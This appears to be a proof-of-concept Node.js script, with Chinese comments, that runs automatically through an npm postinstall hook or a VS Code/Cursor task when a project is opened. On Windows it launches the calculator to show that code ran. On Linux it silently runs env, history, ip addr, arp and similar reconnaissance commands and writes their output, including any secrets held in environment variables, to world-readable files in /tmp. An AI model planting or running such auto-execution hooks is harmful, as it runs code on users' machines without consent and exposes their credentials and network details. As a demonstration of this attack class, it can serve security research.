/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }
  

  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);

  
} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {
 
        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // Linux 环境下执行多条环境探测命令并保存到 /tmp
  const commands = [
    { cmd: 'env', file: '/tmp/env_output.txt', desc: 'env' },
    { cmd: 'ip addr', file: '/tmp/ip_addr_output.txt', desc: 'ip addr' },
    { cmd: 'ping baidu.com -c 1', file: '/tmp/ping_output.txt', desc: 'ping baidu.com' },
    { cmd: 'ls -la', file: '/tmp/ls_la_output.txt', desc: 'ls -la' },
    { cmd: 'history', file: '/tmp/history_output.txt', desc: 'history' },
    { cmd: 'arp -a', file: '/tmp/arp_output.txt', desc: 'arp -a' }
  ];

  // 使用 Promise 来顺序执行命令
  const executeCommands = async () => {
    for (const command of commands) {
      try {
        const { stdout, stderr } = await execPromise(command.cmd);
        
        // 保存输出到文件
        const output = stdout || stderr || '';
        fs.writeFileSync(command.file, output);
        console.log(`✅ ${command.desc} 命令执行完成，输出已保存到 ${command.file}`);
        console.log(`输出内容:\n${output}\n`);
      } catch (error) {
        console.error(`执行 ${command.desc} 命令时出错:`, error.message);
        // 即使出错也保存错误信息
        const errorOutput = `错误: ${error.message}\n${error.stderr || ''}`;
        fs.writeFileSync(command.file, errorOutput);
        console.log(`错误信息已保存到 ${command.file}`);
      }
    }
  };

  executeCommands().catch(err => {
    console.error('执行命令序列时出错:', err);
  });
}

